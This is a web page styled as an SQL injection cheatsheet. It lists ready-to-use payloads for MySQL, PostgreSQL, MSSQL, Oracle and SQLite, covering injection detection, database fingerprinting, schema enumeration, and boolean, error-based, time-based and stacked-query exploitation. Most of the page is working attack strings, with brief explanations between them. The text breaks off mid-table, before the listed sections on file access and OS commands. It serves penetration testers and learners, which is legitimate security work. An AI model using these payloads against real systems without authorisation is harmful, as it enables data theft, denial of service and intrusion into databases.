---
title: "SQL Injection Cheatsheet"
---
<script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
# SQL Injection Cheatsheet

This is an SQL injection cheatsheet with tried and true payloads / techniques that cover the 5 most popular database variants and their derivatives (MySQL, PostgreSQL, MSSQL/SQL Server, Oracle, SQLite).

## Table of Contents

<div class="toc"><button class="toggle">Show/Hide</button><div class="hidden">

* <a href="#key">Key</a>
* <a href="#pronunciation-guide">Pronunciation Guide</a>
* <a href="#avoiding-or-true-or-11">Avoiding OR &lt;true&gt; (OR 1=1)</a>
* <a href="#break--repair-method">Break &amp; Repair Method</a>
* <a href="#identifying-variants">Identifying Variants</a>
* <a href="#comments">Comments</a>
* <a href="#string-concatenation">String Concatenation</a>
* <a href="#substrings">Substrings</a>
* <a href="#length">Length</a>
* <a href="#group-concatenation">Group Concatenation</a>
* <a href="#convert-characters-to-integers-for-comparisons">Convert Characters to Integers for Comparisons</a>
* <a href="#limiting--offsetting-queries">Limiting &amp; Offsetting Queries</a>
* <a href="database-version">Database Version</a>
* <a href="current-database--schema">Current Database / Schema</a>
* <a href="list-databases">List Databases</a>
* <a href="list-tables">List Tables</a>
* <a href="list-columns">List Columns</a>
* <a href="boolean-error-inferential-exploitation">Boolean Error Inferential Exploitation</a>
* <a href="error-based-exploitation">Error Based Exploitation</a>
* <a href="time-based-exploitation">Time Based Exploitation</a>
* <a href="stack-based-injection">Stack Based Exploitation</a>
* <a href="reading-local-files">Reading Local Files</a>
* <a href="writing-local-files">Writing Local Files</a>
* <a href="executing-os-commands">Executing OS Commands</a>
* <a href="references">References</a>
</div></div>

## Key

Some payloads contain placeholders which need to be replaced with specific values before they can be used. Placeholders are denoted with &lt;&gt; and are uppercase, for example &lt;START&gt;. Replace the entire placeholder (including &lt;&gt;).

## Pronunciation Guide

How to pronounce "SQL" correctly. &#x1F60F;

ESS CUE ELL <span style="color:#008000">&#x2714;</span>

SEE KWUHL <span style="color:#FF0000">&#x2718;</span>

SQUEAL <span style="color:#FFBF00">&#xAF;&#x5C;&#x5F;&#x28;&#x30C4;&#x29;&#x5F;&#x2F;&#xAF;</span>

SQUIRREL &#x1F43F;&#xFE0F;

SQUIRTLE &#x1F4A6;&#x1F422;

## Avoiding OR &lt;true&gt; (OR 1=1)

With the exception of CTFs, injections involving an OR &lt;true&gt; expression (e.g. &#x27; OR 1=1 &#x2D;&#x2D; &#x2D;) should be avoided unless absolutely necessary.

I wrote about the reasons why in <a href="https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/">this article</a> and spoke about them at length in <a href="https://www.youtube.com/watch?v=8iSGWP7lk-M">this video</a>.

If you have a "valid value", there is practically no need for an OR &lt;true&gt; when doing SQL injections. A valid value is one which returns a "positive" result in the application, for example a search term that returns 1 or more results, an ID that maps to an actual resource (e.g. user, product, etc.), or a valid username.

## Break & Repair Method

A simplistic but generally reliable method for finding basic SQL injections.

First, "break" the statement by injecting a single or double quote into an otherwise valid value (e.g. `username=admin'`).

Then, replace the injected quote with each of the following "repairs" in turn, to see if one results in the original (uninjected) response:

<table>
<thead>
<tr>
<th>Repair</th>
</tr>
</thead>
<tbody>
<tr>
<td>&#x27; &#x27;</td>
</tr>
<tr>
<td>&#x27;||&#x27;</td>
</tr>
<tr>
<td>&#x27;+&#x27;</td>
</tr>
<tr>
<td>&#x27; AND &#x27;1&#x27;=&#x27;1</td>
</tr>
<tr>
<td>&#x27; &#x2D;&#x2D; &#x2D;</td>
</tr>
</tbody>
</table>

In some cases, none of our "repairs" work because we are injecting into an integer value. In these cases, try the following repairs. Note that each one begins with a space:

<table>
<thead>
<tr>
<th>Repair</th>
</tr>
</thead>
<tbody>
<tr>
<td>&nbsp;&#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>&nbsp;AND 1=1</td>
</tr>
<tr>
<td>&nbsp;AND 1=1 &#x2D;&#x2D; &#x2D;</td>
</tr>
</tbody>
</table>

For example, suppose that some search functionality exists where the search term `shirt` returns 23 results. Thus the valid value is `shirt` and the associated valid response is the page containing 23 results.

Appending a single quote to the search term `shirt'` breaks the SQL statement and now 0 results are returned. Note that this may also be because the search term `shirt'` is now invalid, but the "repair" process should determine this.

Replace the single quote with one of the "repairs", for example `shirt' '`. This new search term once again returns 23 results. Since this matches the original valid response, it is highly likely that the search functionality suffers from SQL injection.

This could be confirmed by attempting a UNION injection attack, or by injecting two boolean payloads:

`shirt' AND '1'='1`

`shirt' AND '1'='0`

The first should return the original valid response (23 results), while the second should return 0 results.

## Identifying Variants

Once a potential injection is found, the database variant (e.g. MySQL, PostgreSQL) can be identified by injecting these payloads in order until a positive result is returned:

<table>
<thead>
<tr>
<th>Order</th>
<th>Payload</th>
<th>If Valid</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>AND &#x27;foo&#x27; &#x27;bar&#x27; = &#x27;foobar&#x27;</td>
<td>MySQL</td>
</tr>
<tr>
<td>2</td>
<td>AND DATALENGTH(&#x27;foo&#x27;) = 3</td>
<td>MSSQL</td>
</tr>
<tr>
<td>3</td>
<td>AND TO_HEX(1) = &#x27;1&#x27;</td>
<td>PostgreSQL</td>
</tr>
<tr>
<td>4</td>
<td>AND LENGTHB(&#x27;foo&#x27;) = &#x27;3&#x27;</td>
<td>Oracle</td>
</tr>
<tr>
<td>5</td>
<td>AND GLOB(&#x27;foo*&#x27;, &#x27;foobar&#x27;) = 1</td>
<td>SQLite</td>
</tr>
</tbody>
</table>

## Comments

This comment syntax can be used to add comments to SQL statements, useful for commenting out anything after an injection, as well as bypassing certain filters. Note that &#x2D;&#x2D; comments require a space after the &#x2D;&#x2D; to be valid, and /\*comment\*/ are in-line comments.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Syntax</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="3" class="span">MySQL</td>
<td># comment</td>
</tr>
<tr>
<td>&#x2D;&#x2D; comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>&#x2D;&#x2D; comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>&#x2D;&#x2D; comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>&#x2D;&#x2D; comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>&#x2D;&#x2D; comment</td>
</tr>
<tr>
<td>/*comment*/</td>
</tr>
</tbody>
</table>

## String Concatenation

These functions / operators can be used to concatenate two or more strings together.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function / Operator</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>&#x27;foo&#x27; &#x27;bar&#x27;</td>
</tr>
<tr>
<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>&#x27;foo&#x27;||&#x27;bar&#x27;</td>
</tr>
<tr>
<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>&#x27;foo&#x27;+&#x27;bar&#x27;</td>
</tr>
<tr>
<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>&#x27;foo&#x27;||&#x27;bar&#x27;</td>
</tr>
<tr>
<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>&#x27;foo&#x27;||&#x27;bar&#x27;</td>
</tr>
<tr>
<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
</tr>
</tbody>
</table>

## Substrings

These functions can be used to select a substring of a string. The START value should be set to 1 (not 0) to start the substring from the first character. Commaless versions are also included for bypassing certain WAFs / filtering.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="4" class="span">MySQL</td>
<td>SUBSTRING(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
<td rowspan="3"></td>
</tr>
<tr>
<td>SUBSTR(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
</tr>
<tr>
<td>MID(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
</tr>
<tr>
<td>SUBSTRING(&#x27;foobar&#x27; FROM &lt;START&gt; FOR &lt;LENGTH&gt;)</td>
<td>SUBSTR and MID can also be used for this commaless version.</td>
</tr>
<tr>
<td rowspan="3" class="span">PostgreSQL</td>
<td>SUBSTRING(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
<td rowspan="7"></td>
</tr>
<tr>
<td>SUBSTR(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
</tr>
<tr>
<td>SUBSTRING(&#x27;foobar&#x27; FROM &lt;START&gt; FOR &lt;LENGTH&gt;)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>SUBSTRING(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SUBSTR(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>SUBSTRING(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
</tr>
<tr>
<td>SUBSTR(&#x27;foobar&#x27;, &lt;START&gt;, &lt;LENGTH&gt;)</td>
</tr>
</tbody>
</table>

## Length

These functions count the length of strings, either in terms of bytes or characters (since some characters can have multiple bytes thanks to Unicode).

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>LENGTH(&#x27;foo&#x27;)</td>
<td>Counts number of bytes</td>
</tr>
<tr>
<td>CHAR_LENGTH(&#x27;foo&#x27;)</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>LENGTH(&#x27;foo&#x27;)</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>DATALENGTH(&#x27;foo&#x27;)</td>
<td>Counts number of bytes</td>
</tr>
<tr>
<td>LEN(&#x27;foo&#x27;)</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>LENGTHB(&#x27;foo&#x27;)</td>
<td>Counts number of bytes</td>
</tr>
<tr>
<td>LENGTH(&#x27;foo&#x27;)</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>LENGTH(&#x27;foo&#x27;)</td>
<td>Counts number of chars (inc. multi-byte chars)</td>
</tr>
</tbody>
</table>

## Group Concatenation

These functions concatenate values from multiple rows of results into a single string. Replace &lt;DELIMITER&gt; with the string/character you want separating each value (e.g. a comma).

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>GROUP_CONCAT(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>STRING_AGG(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>STRING_AGG(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>LISTAGG(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>GROUP_CONCAT(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
</tr>
</tbody>
</table>

## Convert Characters to Integers for Comparisons

Useful for blind SQL injections to determine the range a character falls in. Note that MySQL and Oracle&#x27;s functions output a hexadecimal number, while the others output a decimal.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
<th>Output</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>HEX(&#x27;a&#x27;)</td>
<td>61</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>ASCII(&#x27;a&#x27;)</td>
<td>97</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>UNICODE(&#x27;a&#x27;)</td>
<td>97</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>RAWTOHEX(&#x27;a&#x27;)</td>
<td>61</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>UNICODE(&#x27;a&#x27;)</td>
<td>97</td>
</tr>
</tbody>
</table>

## Limiting & Offsetting Queries

Syntax for limiting the query results to a certain number of rows, as well as offsetting the starting row. Commaless versions are also included for bypassing certain WAFs / filtering.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Limit Query Result to 1 Row</th>
<th>Limit to 1 Row, Starting at Row 5</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td rowspan="2">SELECT * FROM users LIMIT 1</td>
<td>SELECT * FROM users LIMIT 4, 1</td>
</tr>
<tr>
<td>SELECT * FROM users LIMIT 1 OFFSET 4</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>SELECT * FROM users LIMIT 1</td>
<td>SELECT * FROM users LIMIT 1 OFFSET 4</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>SELECT * FROM users ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY</td>
<td>SELECT * FROM users ORDER BY 1 OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY</td>
</tr>
<tr>
<td class="span">Oracle >= v12</td>
<td>SELECT * FROM users FETCH NEXT 1 ROWS ONLY</td>
<td>SELECT * FROM users OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY</td>
</tr>
<tr>
<td class="span">Oracle <= v11</td>
<td>SELECT * FROM users WHERE ROWNUM = 1</td>
<td>SELECT * FROM users WHERE ROWNUM = 5</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td rowspan="2">SELECT * FROM users LIMIT 1</td>
<td>SELECT * FROM users LIMIT 4, 1</td>
</tr>
<tr>
<td>SELECT * FROM users LIMIT 1 OFFSET 4</td>
</tr>
</tbody>
</table>

## Database Version

Functions and operators that provide the version information of the database.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function / Operator</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="3" class="span">MySQL</td>
<td>@@VERSION</td>
</tr>
<tr>
<td>VERSION()</td>
</tr>
<tr>
<td>@@GLOBAL.VERSION</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>VERSION()</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>@@VERSION</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>SELECT BANNER FROM v$version WHERE ROWNUM = 1</td>
</tr>
<tr>
<td>SELECT BANNER FROM gv$version WHERE ROWNUM = 1
</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>sqlite_version()</td>
</tr>
</tbody>
</table>

## Current Database / Schema

Queries which return the currently selected database / schema.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>SELECT DATABASE()</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>SELECT CURRENT_DATABASE()</td>
</tr>
<tr>
<td>SELECT CURRENT_SCHEMA()</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>SELECT SCHEMA_NAME()</td>
</tr>
<tr>
<td rowspan="3" class="span">Oracle</td>
<td>SELECT name FROM V$database</td>
</tr>
<tr>
<td>SELECT * FROM global_name</td>
</tr>
<tr>
<td>SELECT sys_context(&#x27;USERENV&#x27;, &#x27;CURRENT_SCHEMA&#x27;) FROM dual;</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>N/A</td>
</tr>
</tbody>
</table>

## List Databases

Queries which return a list of all databases / schemas.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA</td>
</tr>
<tr>
<td>SELECT db FROM mysql.db</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>SELECT datname FROM pg_database</td>
</tr>
<tr>
<td>SELECT DISTINCT(schemaname) FROM pg_tables</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>SELECT name FROM master.sys.databases</td>
</tr>
<tr>
<td>SELECT name FROM master..sysdatabases</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>N/A</td>
</tr>
</tbody>
</table>

## List Tables

Queries which return a list of all tables in a given database / schema.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2" class="span">MySQL</td>
<td>SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=&#x27;&lt;DBNAME&gt;&#x27;</td>
</tr>
<tr>
<td>SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name=&#x27;&lt;DBNAME&gt;&#x27;</td>
</tr>
<tr>
<td rowspan="2" class="span">PostgreSQL</td>
<td>SELECT tablename FROM pg_tables WHERE schemaname = &#x27;&lt;SCHEMA_NAME&gt;&#x27;</td>
</tr>
<tr>
<td>SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;&lt;SCHEMA_NAME&gt;&#x27;</td>
</tr>
<tr>
<td rowspan="2" class="span">MSSQL</td>
<td>SELECT table_name FROM information_schema.tables WHERE table_catalog=&#x27;&lt;DBNAME&gt;&#x27;</td>
</tr>
<tr>
<td>SELECT name FROM &lt;DBNAME&gt;..sysobjects WHERE xtype=&#x27;U&#x27;</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER=&#x27;&lt;DBNAME&gt;&#x27;</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>SELECT tbl_name FROM sqlite_master WHERE type=&#x27;table&#x27;</td>
</tr>
</tbody>
</table>

## List Columns

Queries which return a list of all columns in a given table & database / schema pair.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=&#x27;&lt;TABLE_NAME&gt;&#x27; AND table_schema=&#x27;&lt;DBNAME&gt;&#x27;</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=&#x27;&lt;DBNAME&gt;&#x27; AND table_name=&#x27;&lt;TABLE_NAME&gt;&#x27;</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>SELECT COL_NAME(OBJECT_ID(&#x27;&lt;DBNAME&gt;.&lt;TABLE_NAME&gt;&#x27;), &lt;INDEX&gt;)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=&#x27;&lt;TABLE_NAME&gt;&#x27; AND OWNER=&#x27;&lt;DBNAME&gt;&#x27;</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>SELECT MAX(sql) FROM sqlite_master WHERE tbl_name=&#x27;&lt;TABLE_NAME&gt;&#x27;</td>
</tr>
<tr>
<td>SELECT name FROM PRAGMA_TABLE_INFO(&#x27;&lt;TABLE_NAME&gt;&#x27;)</td>
</tr>
</tbody>
</table>

## Boolean Error Inferential Exploitation

Payloads which cause an error in the SQL if the 1=1 conditional is true. Replace the 1=1 with a condition you want to test; if an error propagates back to the response in some measurable way (e.g. 500 Internal Server Error), then the condition is true.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>AND 1=(SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),1))</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INTEGER) ELSE 1 END)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;1&#x27; END FROM dual)</td>
</tr>
<tr>
<td rowspan="2" class="span">SQLite</td>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN load_extension(1) ELSE 1 END)</td>
</tr>
<tr>
<td>AND 1=(SELECT CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END)</td>
</tr>
</tbody>
</table>

## Error Based Exploitation

These injection payloads should cause a database error and return the version information of the database variant within that error.

### MySQL

<table>
<thead>
<tr>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND GTID_SUBSET(CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;),1337) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;)) USING utf8))) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND EXTRACTVALUE(1337,CONCAT(&#x27;.&#x27;,&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;)) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND UPDATEXML(1337,CONCAT(&#x27;.&#x27;,&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;),31337) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>OR 1 GROUP BY CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;,FLOOR(RAND(0)*2)) HAVING MIN(0) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND EXP(~(SELECT * FROM (SELECT CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;,&#x27;x&#x27;))x)) &#x2D;&#x2D; &#x2D;</td>
</tr>
</tbody>
</table>

### PostgreSQL

<table>
<thead>
<tr>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 1337=CAST(&#x27;~&#x27;||(SELECT version())::text||&#x27;~&#x27; AS NUMERIC) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND (CAST(&#x27;~&#x27;||(SELECT version())::text||&#x27;~&#x27; AS NUMERIC)) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND CAST((SELECT version()) AS INT)=1337 &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND (SELECT version())::int=1 &#x2D;&#x2D; &#x2D;</td>
</tr>
</tbody>
</table>

### MSSQL

<table>
<thead>
<tr>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 1337 IN (SELECT (&#x27;~&#x27;+(SELECT @@version)+&#x27;~&#x27;)) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND 1337=CONVERT(INT,(SELECT &#x27;~&#x27;+(SELECT @@version)+&#x27;~&#x27;)) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND 1337=CONCAT(&#x27;~&#x27;,(SELECT @@version),&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
</tr>
</tbody>
</table>

### Oracle

<table>
<thead>
<tr>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||&#x27;~&#x27;||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),&#x27; &#x27;,&#x27;_&#x27;),&#x27;$&#x27;,&#x27;(DOLLAR)&#x27;),&#x27;@&#x27;,&#x27;(AT)&#x27;),&#x27;#&#x27;,&#x27;(HASH)&#x27;))||&#x27;~&#x27;||CHR(62))) FROM DUAL) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND 1337=UTL_INADDR.GET_HOST_ADDRESS(&#x27;~&#x27;||(SELECT banner FROM v$version)||&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND 1337=CTXSYS.DRITHSX.SN(1337,&#x27;~&#x27;||(SELECT banner FROM v$version)||&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td>AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH(&#x27;~&#x27;||(SELECT banner FROM v$version)||&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
</tr>
</tbody>
</table>

## Time Based Exploitation

### Simple Time Based Injections

Note that these injection payloads are inherently dangerous as the sleep function may execute multiple times. They will cause the database to sleep for 10 seconds per row evaluated by the query.

These should only be used if you are certain only one row is going to be evaluated by the query you are injecting into.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>AND SLEEP(10)=0</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>AND &#x27;RANDSTR&#x27;||PG_SLEEP(10)=&#x27;RANDSTR&#x27;</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>AND 1337=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))</td>
</tr>
</tbody>
</table>

### Complex Time Based Injections

These injection payloads are "safe" and should only ever sleep (for 10 seconds) once per statement. Replace the 1=1 with a condition you want to test; if a delay of 10 seconds occurs, then the condition is true.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)</td>
</tr>
</tbody>
</table>

## Stack Based Injection

Generally if stack based injection is supported, it is only detectable by causing a time based delay. These injection payloads should cause a delay of 10 seconds:

<table>
<thead>
<tr>
<th>Variant</th>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>; SLEEP(10) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>; PG_SLEEP(10) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>; WAITFOR DELAY &#x27;0:0:10&#x27; &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>; DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) &#x2D;&#x2D; &#x2D;</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>; RANDOMBLOB(1000000000/2) &#x2D;&#x2D; &#x2D;</td>
</tr>
</tbody>
</table>

 These injection payloads should cause a delay of 10 seconds if the 1=1 conditional is true. Replace the 1=1 with a condition you want to test; if a delay of 10 seconds occurs, then the condition is true.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Payload</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>; SELECT IF((1=1),SLEEP(10),1337)</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>; SELECT (CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
